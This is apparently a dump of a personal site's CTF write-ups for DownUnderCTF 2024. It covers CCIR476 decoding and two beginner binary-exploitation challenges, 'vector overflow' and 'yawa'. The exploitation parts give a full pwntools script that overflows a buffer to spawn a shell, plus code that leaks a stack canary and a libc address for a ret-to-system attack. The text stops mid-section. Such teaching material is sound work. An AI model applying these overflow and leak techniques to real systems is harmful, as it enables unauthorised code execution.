plugin","title":"Prologue"},{"location":"transmissions/#my-struggle","text":"Quick google CCIR476 leads us to wiki page that explains that CCIR476 is a character enconding used in radio data protocol. So seems like we should start by decoding the message. Article itself is not too friendly and doesn't explain much (too many technical words without definition for my liking), but there is important bit: CCIR476 encodes each character as 7-bits. This allows us quickly test if our input is indeed CCID476 message or not without investing hours moving in the wrong direction: length of input is 441 which is exactly 63 7bit words. Looks promising! Second link in google is https://blog.gcwizard.net/manual/en/ccitt-codes/08-what-is-ccir-476/ Which contains table that can be used for decoding: So in the first iteration I created alphabet with all characters I can understand and left others ( CR , LTRS , FIGS ) empty: Interation 1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 letters = { \"1000111\" : \"A\" , \"1110010\" : \"B\" , \"0011101\" : \"C\" , \"1010011\" : 'D' , \"1010110\" : \"E\" , \"0011011\" : \"F\" , \"0110101\" : \"G\" , \"1101001\" : \"H\" , \"1001101\" : \"I\" , \"0010111\" : \"J\" , \"0011110\" : \"K\" , \"1100101\" : \"L\" , \"0111001\" : \"M\" , \"1011001\" : \"N\" , \"1110001\" : \"O\" , \"0101101\" : \"P\" , \"0101110\" : 'Q' , \"1010101\" : \"R\" , \"1001011\" : \"S\" , \"1110100\" : \"T\" , \"1001110\" : \"U\" , \"0111100\" : \"V\" , \"0100111\" : \"W\" , \"0111010\" : \"X\" , \"0101011\" : \"Y\" , \"1100011\" : \"Z\" , \"1011100\" : \" \" , \"1111000\" : \"\" , \"0110110\" : \"\" , \"1011010\" : \"\" , } input = \"101101001101101101001110100110110101110100110100101101101010110101110010110100101110100111001101100101101101101000111100011110011011010101011001011101101010010111011100100011110101010110110101011010111001011010110100101101101010110101101011001011010011101110001101100101110101101010110011011100001101101101101010101101101000111010110110010111010110101100101100110111101000101011101110001101101101001010111001011101110001010111001011100011011\" for i in range ( 0 , len ( input ), 7 ): # generate sequence 0, 7, 14 ... 441 word = input [ i : i + 7 ] # take 7 characters starting at i print ( letters [ word ], end = \"\" ) # print letter from alphabet that corresponds to the sequence The output is exciting, I can even read the sentence: 1 HHTHE QUPKKRSS ARE HELD QN FRCQLITY HQQOQQF But some letters are wrong, and also according to description of the challenge answer starts with ## . So, how can we get from HH to ## ? Notice in encoding table there are many columns and 1101001 is H in letters case, but # in US TTYs (whatever that means). Probably ignored so far characters CR , LTRS and FIGS could be helpful. Explanation is very obvious, but on the day it quite some digging: LTRS - switches decoding into letters mode (ie after LTRS all characters are letters until FIGS is encountered) FIGS - switching decoding into figures mode (ie all characters from now on will be symbols until LTRS is encountered) Second alphabet added, slightly updated decoding logic: full solution 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 letters = { \"1000111\" : \"A\" , \"1110010\" : \"B\" , \"0011101\" : \"C\" , \"1010011\" : 'D' , \"1010110\" : \"E\" , \"0011011\" : \"F\" , \"0110101\" : \"G\" , \"1101001\" : \"H\" , \"1001101\" : \"I\" , \"0010111\" : \"J\" , \"0011110\" : \"K\" , \"1100101\" : \"L\" , \"0111001\" : \"M\" , \"1011001\" : \"N\" , \"1110001\" : \"O\" , \"0101101\" : \"P\" , \"0101110\" : 'Q' , \"1010101\" : \"R\" , \"1001011\" : \"S\" , \"1110100\" : \"T\" , \"1001110\" : \"U\" , \"0111100\" : \"V\" , \"0100111\" : \"W\" , \"0111010\" : \"X\" , \"0101011\" : \"Y\" , \"1100011\" : \"Z\" , \"1011100\" : \" \" , \"1111000\" : \"\" , \"0110110\" : \"FIGS\" , \"1011010\" : \"LTRS\" , } figures = { \"1010011\" : '$' , \"1000111\" : \"-\" , \"1110001\" : \"9\" , \"1010110\" : \"3\" , \"1011100\" : \" \" , \"0011101\" : \":\" , \"0011011\" : \"!\" , \"0110101\" : \"&\" , \"1101001\" : \"#\" , \"1100101\" : \")\" , \"1001101\" : \"8\" , \"0010111\" : \"`\" , \"0011110\" : \"(\" , \"0111001\" : \".\" , \"1011001\" : \",\" , \"0101101\" : \"0\" , \"0101110\" : '1' , \"1010101\" : \"4\" , \"1001011\" : \"'\" , \"1110100\" : \"5\" , \"1001110\" : \"7\" , \"0111100\" : \";\" , \"0100111\" : \"2\" , \"0111010\" : \"/\" , \"0101011\" : \"6\" , \"1100011\" : \" \\\" \" , \"1111000\" : \"\" , \"0110110\" : \"FIGS\" , \"1011010\" : \"LTRS\" , } mode = figures # variable to switch between letters and figures alphabets input = \"101101001101101101001110100110110101110100110100101101101010110101110010110100101110100111001101100101101101101000111100011110011011010101011001011101101010010111011100100011110101010110110101011010111001011010110100101101101010110101101011001011010011101110001101100101110101101010110011011100001101101101101010101101101000111010110110010111010110101100101100110111101000101011101110001101101101001010111001011101110001010111001011100011011\" for w in range ( 0 , len ( input ), 7 ): # generate sequence 0, 7, 14 ... 441 word = input [ w : w + 7 ] # take 7 characters starting at i if mode [ word ] == \"FIGS\" : mode = figures elif mode [ word ] == \"LTRS\" : mode = letters else : print ( mode [ input [ w : w + 7 ]], end = \"\" ) # print letter from alphabet that corresponds to the sequence The only thing not mentioned before is I used ' instead of BELL character because its not clear what BELL means and single quote grammatically makes sense.","title":"My struggle"},{"location":"transmissions/#epilogue","text":"Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Epilogue"},{"location":"vector/","text":"Prologue \u00b6 Difficulty: beginner Category: binary exploitation Solved: 239 Description Please overflow into the vector and control it! Input files: vector_overflow.c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #include <cstdlib> #include <iostream> #include <string> #include <vector> char buf [ 16 ]; std :: vector < char > v = { 'X' , 'X' , 'X' , 'X' , 'X' }; void lose () { puts ( \"Bye!\" ); exit ( 1 ); } void win () { system ( \"/bin/sh\" ); exit ( 0 ); } int main () { char ductf [ 6 ] = \"DUCTF\" ; char * d = ductf ; std :: cin >> buf ; if ( v . size () == 5 ) { for ( auto & c : v ) { if ( c != * d ++ ) { lose (); } } win (); } lose (); } vector_overflow binary NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin My struggle \u00b6 Analysis \u00b6 This is one of the most straightforward challenges that is a good introduction to binary exploitation. First review source code to understand what the program intends to do and where is vulnerability we can target: trimmed source code with explanaition 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 char buf [ 16 ]; std :: vector < char > v = { 'X' , 'X' , 'X' , 'X' , 'X' }; int main () { char ductf [ 6 ] = \"DUCTF\" ; // initializes ductf to string \"DUCTF\" char * d = ductf ; std :: cin >> buf ; // read user input into global variable buf // compare variable ductf with global variable v, // if they are equal, execute win() // otherwise execute lose() if ( v . size () == 5 ) { for ( auto & c : v ) { if ( c != * d ++ ) { lose (); } } win (); } lose (); } So, in order to execute win() we should change variable v to be DUCTF , notice how global variables are next to each other? v is declared right after buf , this means that there is a good chance that in memory they also will be placed sequentially one after another. We can test this theory and find locations of global variables by inspecting the binary. First, lets check its general information: 1 2 3 4 5 6 7 8 9 $ file vector_overflow vector_overflow: ELF 64 -bit LSB executable, x86-64, # 64-bit executable version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID [ sha1 ]= 4a0b824c662ee47b5cd3e73176c0092f1fcf714b, for GNU/Linux 3 .2.0, not stripped # symbols are not stripped There are two tools we can use find locations of variable: open the binary in ghidra given symbols are not stripped, we can search them by name: On the image: 1 search for variable buf in symbol tree 2 select it in the list 3 once selected the main view show address of the variable 004051e0 4 ghidra also annotates variable names in the main view we can see both buf and v right after it( address 004051f0 ) second option to find out address with ghidra is through assembly (this works even if binary symbols are stripped): On the image: 1 go to function main (ghidra usually detects it automatically, sometimes depending of source language it can be called entry or have a standard language wrapper) 2 find call to operator>> on std::cin 3 work up from call and check how registers initialised before the call, we can see RSI is initialised with address to a global variable buf (if there would be no symbols we would see DATA_004051e0 instead of buf which doesn't change much). Similarly, we could find below in assembly access to another global variable ( v or DATA_004051f0 ) when comparing of content happens. Launch the binary in gdb and inspect memory find variables by name 1 2 3 4 5 6 7 $ gdb ./vector_overflow ( gdb ) b main # breakpoint at main function ( gdb ) r # run executable till it hits breakpoint ( gdb ) p & buf # check address of variable buf $1 = ( <data variable, no debug info> * ) 0x4051e0 <buf> ( gdb ) p & v # check address of variable v $2 = ( <data variable, no debug info> * ) 0x4051f0 <v> inspect memory 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ gdb ./vector_overflow ( gdb ) b main # breakpoint at main function ( gdb ) r # run executable till it hits breakpoint ( gdb ) # step with `ci` through the code till we will be asked to enter input myteststring # our input that saved into buffer ( gdb ) search myteststring # scan memory where our string was saved (requires pwndbg plugin) Searching for value: 'myteststring' vector_overflow 0x4051e0 'myteststring' # found our global variable at address 0x4051e0 [ heap ] 0x4182d0 'myteststring\\n' ( gdb ) x/16c 0x4051e0 # read 16 characters from address 0x4051e0 (remember type of variable buf is char[16]) 0x4051e0: 'm' 'y' 't' 'e' 's' 't' 's' 't' 'r' 'i' 'n' 'g' '0' '0' '0' '0' ( gdb ) x/2gx 0x4051f0+16 # read two giant (8byte) numbers in hex format starting after buf ends 0x4051f0 <v>: 0x00000000004182b0 0x00000000004182b5 # vector in represented in memory as two consecutive pointers to start and end of content ( gdb ) print 0x00000000004182b5 - 0x00000000004182b0 # we can check length is 5 $3 = 5 ( gdb ) x/5c 0x00000000004182b0 # read 5 characters from the start of the vector data 0x4182b0: 88 'X' 88 'X' 88 'X' 88 'X' 88 'X' # 88 is ascii value of 'X' (remember in source code we have `vector v = {'X', 'X', 'X', 'X', 'X'}) Exploit \u00b6 So, given program reads as much data as we provide, we are not limited to 16 characters, we can overflow into v and change vector to DUCTF . To reiterate this is memory layout that we normally have (see analysis section above for more detailed explanation of each element): 1 2 3 4 5 ( gdb ) x/32bx 0x4051e0 # read 32 bytes at buf address 0x4051e0 <buf>: 0x6d 0x79 0x74 0x65 0x73 0x74 0x73 0x74 # start of buf ascii of myteststring 0x4051e8 <buf+8>: 0x72 0x69 0x6e 0x67 0x00 0x00 0x00 0x00 0x4051f0 <v>: 0xb0 0x82 0x41 0x00 0x00 0x00 0x00 0x00 # start of variable v first 8 bytes is pointer to start of content of the vector 0x4051f8 <v+8>: 0xb5 0x82 0x41 0x00 0x00 0x00 0x00 0x00 # second pointer of v points to end of content of the vector Note that pointer addresses that we saw before (0x00000000004182b0, 0x00000000004182b5) are written in little endian format (reversed of what we used to). For example value 0x0055000004000201 is stored as 0x01 0x02 0x00 0x04 0x00 0x00 0x55 0x00 in memory. Our goal is to achieve following memory state: 1 2 3 4 5 ( gdb ) x/32bx 0x4051e0 # read 32 bytes at buf address 0x4051e0 <buf>: 'D' 'U' 'C' 'T' 'F' 0x00 0x00 0x00 # start out input with DUCTF 0x4051e8 <buf+8>: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 # rest of the buffer is not important 0x4051f0 <v>: 0xe0 0x51 0x40 0x00 0x00 0x00 0x00 0x00 # first pointer of v should point to DUCTF that we entered above 0x4051f8 <v+8>: 0xe5 0x51 0x40 0x00 0x00 0x00 0x00 0x00 # second pointer of v should point to end string DUCTF If all required bytes were ascii printable it would be easy to enter them manually, but they don't so I used pwntools . This is CTF framework for binary exploitation, its only \"disadvantage\" is it has all features you can think of, so it can be overwhelming sometimes. python script output 1 2 3 4 5 6 7 paylod = flat ( # concatenate all elements one after another b 'DUCTF \\x00 ' , # first first bytes of the buffer is string DUCTF ' \\x00 ' * 10 , # fill in remaining 10 character with null bytes pack ( 0x4051e0 ), # address 0x4051e0 converted to 8 bytes in little endian format pack ( 0x4051e0 + 5 ) # address 0x4051e5 converted to 8 bytes in little endian format ) print ( hexdump ( paylod )) 00000000 44 55 43 54 46 00 00 00 00 00 00 00 00 00 00 00 \u2502DUCT\u2502F\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502 00000010 e0 51 40 00 00 00 00 00 e5 51 40 00 00 00 00 00 \u2502\u00b7Q@\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7Q@\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502 Full script to launch binary (or connect to CTF server if REMOTE param provided) and send the payload: solve.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 from pwn import * # initialize library to work with binary context . binary = elfexe = ELF ( './vector_overflow' ) libc = elfexe . libc context . log_level = 'warn' arguments = [] if args [ 'REMOTE' ]: # if REMOTE argument provided, connect to the challenge server, otherwise launch binary locally remote_server = '2024.ductf.dev' remote_port = 30013 io = remote ( remote_server , remote_port ) else : io = process ([ elfexe . path ] + arguments ) paylod = flat ( # build payload b 'DUCTF \\x00 ' , ' \\x00 ' * 10 , pack ( 0x4051e0 ), pack ( 0x4051e0 + 5 ) ) io . sendline ( paylod ) # send to server/binary io . interactive () # switch to interactive mode when you got the shell, you can now use `ls`, `cat flag.txt` io . close () Epilogue \u00b6 Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Vector overflow"},{"location":"vector/#prologue","text":"Difficulty: beginner Category: binary exploitation Solved: 239 Description Please overflow into the vector and control it! Input files: vector_overflow.c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #include <cstdlib> #include <iostream> #include <string> #include <vector> char buf [ 16 ]; std :: vector < char > v = { 'X' , 'X' , 'X' , 'X' , 'X' }; void lose () { puts ( \"Bye!\" ); exit ( 1 ); } void win () { system ( \"/bin/sh\" ); exit ( 0 ); } int main () { char ductf [ 6 ] = \"DUCTF\" ; char * d = ductf ; std :: cin >> buf ; if ( v . size () == 5 ) { for ( auto & c : v ) { if ( c != * d ++ ) { lose (); } } win (); } lose (); } vector_overflow binary NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin","title":"Prologue"},{"location":"vector/#my-struggle","text":"","title":"My struggle"},{"location":"vector/#analysis","text":"This is one of the most straightforward challenges that is a good introduction to binary exploitation. First review source code to understand what the program intends to do and where is vulnerability we can target: trimmed source code with explanaition 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 char buf [ 16 ]; std :: vector < char > v = { 'X' , 'X' , 'X' , 'X' , 'X' }; int main () { char ductf [ 6 ] = \"DUCTF\" ; // initializes ductf to string \"DUCTF\" char * d = ductf ; std :: cin >> buf ; // read user input into global variable buf // compare variable ductf with global variable v, // if they are equal, execute win() // otherwise execute lose() if ( v . size () == 5 ) { for ( auto & c : v ) { if ( c != * d ++ ) { lose (); } } win (); } lose (); } So, in order to execute win() we should change variable v to be DUCTF , notice how global variables are next to each other? v is declared right after buf , this means that there is a good chance that in memory they also will be placed sequentially one after another. We can test this theory and find locations of global variables by inspecting the binary. First, lets check its general information: 1 2 3 4 5 6 7 8 9 $ file vector_overflow vector_overflow: ELF 64 -bit LSB executable, x86-64, # 64-bit executable version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID [ sha1 ]= 4a0b824c662ee47b5cd3e73176c0092f1fcf714b, for GNU/Linux 3 .2.0, not stripped # symbols are not stripped There are two tools we can use find locations of variable: open the binary in ghidra given symbols are not stripped, we can search them by name: On the image: 1 search for variable buf in symbol tree 2 select it in the list 3 once selected the main view show address of the variable 004051e0 4 ghidra also annotates variable names in the main view we can see both buf and v right after it( address 004051f0 ) second option to find out address with ghidra is through assembly (this works even if binary symbols are stripped): On the image: 1 go to function main (ghidra usually detects it automatically, sometimes depending of source language it can be called entry or have a standard language wrapper) 2 find call to operator>> on std::cin 3 work up from call and check how registers initialised before the call, we can see RSI is initialised with address to a global variable buf (if there would be no symbols we would see DATA_004051e0 instead of buf which doesn't change much). Similarly, we could find below in assembly access to another global variable ( v or DATA_004051f0 ) when comparing of content happens. Launch the binary in gdb and inspect memory find variables by name 1 2 3 4 5 6 7 $ gdb ./vector_overflow ( gdb ) b main # breakpoint at main function ( gdb ) r # run executable till it hits breakpoint ( gdb ) p & buf # check address of variable buf $1 = ( <data variable, no debug info> * ) 0x4051e0 <buf> ( gdb ) p & v # check address of variable v $2 = ( <data variable, no debug info> * ) 0x4051f0 <v> inspect memory 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ gdb ./vector_overflow ( gdb ) b main # breakpoint at main function ( gdb ) r # run executable till it hits breakpoint ( gdb ) # step with `ci` through the code till we will be asked to enter input myteststring # our input that saved into buffer ( gdb ) search myteststring # scan memory where our string was saved (requires pwndbg plugin) Searching for value: 'myteststring' vector_overflow 0x4051e0 'myteststring' # found our global variable at address 0x4051e0 [ heap ] 0x4182d0 'myteststring\\n' ( gdb ) x/16c 0x4051e0 # read 16 characters from address 0x4051e0 (remember type of variable buf is char[16]) 0x4051e0: 'm' 'y' 't' 'e' 's' 't' 's' 't' 'r' 'i' 'n' 'g' '0' '0' '0' '0' ( gdb ) x/2gx 0x4051f0+16 # read two giant (8byte) numbers in hex format starting after buf ends 0x4051f0 <v>: 0x00000000004182b0 0x00000000004182b5 # vector in represented in memory as two consecutive pointers to start and end of content ( gdb ) print 0x00000000004182b5 - 0x00000000004182b0 # we can check length is 5 $3 = 5 ( gdb ) x/5c 0x00000000004182b0 # read 5 characters from the start of the vector data 0x4182b0: 88 'X' 88 'X' 88 'X' 88 'X' 88 'X' # 88 is ascii value of 'X' (remember in source code we have `vector v = {'X', 'X', 'X', 'X', 'X'})","title":"Analysis"},{"location":"vector/#exploit","text":"So, given program reads as much data as we provide, we are not limited to 16 characters, we can overflow into v and change vector to DUCTF . To reiterate this is memory layout that we normally have (see analysis section above for more detailed explanation of each element): 1 2 3 4 5 ( gdb ) x/32bx 0x4051e0 # read 32 bytes at buf address 0x4051e0 <buf>: 0x6d 0x79 0x74 0x65 0x73 0x74 0x73 0x74 # start of buf ascii of myteststring 0x4051e8 <buf+8>: 0x72 0x69 0x6e 0x67 0x00 0x00 0x00 0x00 0x4051f0 <v>: 0xb0 0x82 0x41 0x00 0x00 0x00 0x00 0x00 # start of variable v first 8 bytes is pointer to start of content of the vector 0x4051f8 <v+8>: 0xb5 0x82 0x41 0x00 0x00 0x00 0x00 0x00 # second pointer of v points to end of content of the vector Note that pointer addresses that we saw before (0x00000000004182b0, 0x00000000004182b5) are written in little endian format (reversed of what we used to). For example value 0x0055000004000201 is stored as 0x01 0x02 0x00 0x04 0x00 0x00 0x55 0x00 in memory. Our goal is to achieve following memory state: 1 2 3 4 5 ( gdb ) x/32bx 0x4051e0 # read 32 bytes at buf address 0x4051e0 <buf>: 'D' 'U' 'C' 'T' 'F' 0x00 0x00 0x00 # start out input with DUCTF 0x4051e8 <buf+8>: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 # rest of the buffer is not important 0x4051f0 <v>: 0xe0 0x51 0x40 0x00 0x00 0x00 0x00 0x00 # first pointer of v should point to DUCTF that we entered above 0x4051f8 <v+8>: 0xe5 0x51 0x40 0x00 0x00 0x00 0x00 0x00 # second pointer of v should point to end string DUCTF If all required bytes were ascii printable it would be easy to enter them manually, but they don't so I used pwntools . This is CTF framework for binary exploitation, its only \"disadvantage\" is it has all features you can think of, so it can be overwhelming sometimes. python script output 1 2 3 4 5 6 7 paylod = flat ( # concatenate all elements one after another b 'DUCTF \\x00 ' , # first first bytes of the buffer is string DUCTF ' \\x00 ' * 10 , # fill in remaining 10 character with null bytes pack ( 0x4051e0 ), # address 0x4051e0 converted to 8 bytes in little endian format pack ( 0x4051e0 + 5 ) # address 0x4051e5 converted to 8 bytes in little endian format ) print ( hexdump ( paylod )) 00000000 44 55 43 54 46 00 00 00 00 00 00 00 00 00 00 00 \u2502DUCT\u2502F\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502 00000010 e0 51 40 00 00 00 00 00 e5 51 40 00 00 00 00 00 \u2502\u00b7Q@\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7Q@\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502 Full script to launch binary (or connect to CTF server if REMOTE param provided) and send the payload: solve.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 from pwn import * # initialize library to work with binary context . binary = elfexe = ELF ( './vector_overflow' ) libc = elfexe . libc context . log_level = 'warn' arguments = [] if args [ 'REMOTE' ]: # if REMOTE argument provided, connect to the challenge server, otherwise launch binary locally remote_server = '2024.ductf.dev' remote_port = 30013 io = remote ( remote_server , remote_port ) else : io = process ([ elfexe . path ] + arguments ) paylod = flat ( # build payload b 'DUCTF \\x00 ' , ' \\x00 ' * 10 , pack ( 0x4051e0 ), pack ( 0x4051e0 + 5 ) ) io . sendline ( paylod ) # send to server/binary io . interactive () # switch to interactive mode when you got the shell, you can now use `ls`, `cat flag.txt` io . close ()","title":"Exploit"},{"location":"vector/#epilogue","text":"Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Epilogue"},{"location":"yawa/","text":"Prologue \u00b6 Difficulty: beginner Category: binary exploitation Solved: 184 Description Yet another welcome application. Input files: yawa.c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #include <stdio.h> #include <stdlib.h> #include <unistd.h> void init () { setvbuf ( stdin , 0 , 2 , 0 ); setvbuf ( stdout , 0 , 2 , 0 ); } int menu () { int choice ; puts ( \"1. Tell me your name\" ); puts ( \"2. Get a personalised greeting\" ); printf ( \"> \" ); scanf ( \"%d\" , & choice ); return choice ; } int main () { init (); char name [ 88 ]; int choice ; while ( 1 ) { choice = menu (); if ( choice == 1 ) { read ( 0 , name , 0x88 ); } else if ( choice == 2 ) { printf ( \"Hello, %s \\n \" , name ); } else { break ; } } } yawa binary libc.so.6 ld-linux-x86-64.so.2 NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin My struggle \u00b6 Task includes binary(with libc library and ld linker to run it) and source code. First thing I review source code to build a plan. There is no win() function or equivalent so we likely have to get RCE (shell or similar). Source code is so short that it don't take long to find a bug in code that we can exploit: 1 2 3 4 5 6 7 8 9 10 11 12 13 char name [ 88 ]; # desclare variable name int choice ; while ( 1 ) { choice = menu (); if ( choice == 1 ) { read ( 0 , name , 0x88 ); # read input into variable name } else if ( choice == 2 ) { printf ( \"Hello, %s \\n \" , name ); } else { break ; } } Variable name is a buffer of 88 characters, but read(0, name 0x88) reads up to 0x88 = 136 characters. Means we can overflow stack and get code execution. Now that we know what to do lets check what type of binary we have and what types of protection are enabled: 1 2 3 4 5 6 7 8 9 10 11 12 13 $ file yawa yawa: ELF 64 -bit LSB pie executable, x86-64, # 64-bit version 1 ( SYSV ) , dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3 .2.0, BuildID [ sha1 ]= 7f7b72aaab967245353b6816808804a6c4ad2168, not stripped $ checksec --file = yawa RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Full RELRO Canary found NX enabled PIE enabled No RPATH RW-RUNPATH 45 Symbols No 0 2 yawa So, we have full package: Canary stack protection - stack is protected from overwrites; NX enabled - stack is not executable; PIE enabled - every time you run the file it gets loaded into a different memory address. If you are not familiar with any of above techniques and would like to learn about them (I am going to briefly touch them, but there is goal to include in-detail explanation of each of the techniques in this writeup) I recommend reading following gitbook notes: https://ir0nstone.gitbook.io/notes . This is by a long shot the best resource I have seen on internet on the topic both quality of explanation and completeness of content is superb. Next I use pwninit to be able to run binary on my machine without need to juggle with environment variable paths etc: 1 $ pwninit --bin yawa --libc ./libc.so.6 Exploit algorithm: Leak canary value from stack to bypass canary protection; Leak libc address to find system call; Use buffer overflow to get remote shell and obtain flag. Here is sample memory layout of stack that we will be working with: Memory layout 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0x7fffffffdc60: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc68: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc70: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc78: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc80: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc88: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc90: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc98: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdca0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdca8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdcb0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdcb8: 0x00 0x87 0x60 0x15 0x3c 0x9c 0x6f 0x4b 0x7fffffffdcc0: 0x01 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdcc8: 0x90 0x9d 0xc2 0xf7 0xff 0x7f 0x00 0x00 0x7fffffffdcd0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 Variable name is stored at address 0x7fffffffdc60 (line 1). Canary value is stored at address 0x7fffffffdcb8 (line 12), it always ends with 0x00 on linux (remember - its little endian). Therefore, its value is 0x4b6f9c3c15608700. At address 0x7fffffffdcb8 we see some 8byte long number 1 (not sure what it is - I've left it untouched in my work). At address 0x7fffffffdcc8 (line 14) we see return address from the main function (0x00007ffff7c29d90), here we want to place jump to system call. Leak canary value \u00b6 Canary protection (read more here ) puts a random value on stack before execution and checks if hasn't been modified while function was running (if it is - program exits). If we want overwrite return address at 0x7fffffffdcc8, by overflowing variable name at 0x7fffffffdc60, we will have overwrite canary address at 0x7fffffffdcb8 as we can only write continues block of memory. Therefore, we will have to leak canary value from stack and when we overflow buffer put exactly same bytes in the same place to prevent canary protection from triggering. To leak address we can take advantage of \"print your name functionality\": 1 2 3 } else if ( choice == 2 ) { printf ( \"Hello, %s \\n \" , name ); } %s modifier of printf prints all bytes starting from address name until it reaches nullbyte. So if we put 'a' from 0x7fffffffdc60 till 0x7fffffffdcb8, it is going to print aaaaa... and won't stop just on 'a' (as there is no nullbyte) it will continue printing up until 0x7fffffffdcc0 (including entire canary value) and then stop: leak canary block 1 2 3 4 5 6 7 8 9 10 11 12 # 'io' is pwntools input/output pipe object that connected to process or remote server def get_canary_value (): io . recvuntil ( b \"> \" ) # wait till target binary initialises io . sendline ( b \"1\" ) # send choice 1 - enter value for name io . sendline ( b \"a\" * 88 ) # enter our name 88 a + '\\n' (newline char appended by function sendline - it will overwrite nullbyte of canary) io . recvuntil ( b \"> \" ) # wait till binary asks us to make a choice io . sendline ( b \"2\" ) # send choice 2 - print name value io . recvline () # receive all aaaa... till '\\n' addr_raw = io . recvline () . strip () # receive canary value in little endian order addr_raw = bytearray ( 1 ) + addr_raw # append nullbyte that we skipped return unpack ( addr_raw [ 0 : 8 ]) # convert to little endian byte array number Leak libc address \u00b6 Next step is to find base virtual address of libc, so we can find system call. Address on stack of return address from our main function is address of __libc_start_call_main - as you might guess its inside libc library. To read address of the function, we can use same technique as we used previously to reading canary value. When library is loaded into memory, its loaded as a single blob, so even though virtual location will be different each time, blob content is always same. Therefore we can calculate position of elements inside the library relative to each other and it won't change doesn't matter where library is loaded: 1 2 3 4 $ readelf -s ./libc.so.6 | grep __libc_start_cal 6 : 0000000000029d10 172 FUNC LOCAL DEFAULT 15 __libc_start_cal [ ... ] $ readelf -s libc.so.6 | grep system 8412 : 0000000000050d70 45 FUNC WEAK DEFAULT 15 system This means that system function will be always 0x50d70-0x29d10 = 0x27060 bytes apart from __libc_start_call_main function. For our our sample memory dump we saw return address 0x7ffff7c29d90 - we return to the middle of libc_start_call_main , so we can infer that libc library is mapped to address 0x7ffff7c29d90 - 0x29d90 = 0x7ffff7c00000 (segments are typically round numbers). So system address is 0x7ffff7c00000 + 0x50d70 = 0x7ffff7c50d70 . We can also double check our calculations by checking process memory mapping using gdb or cat: gdb debugger bash 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 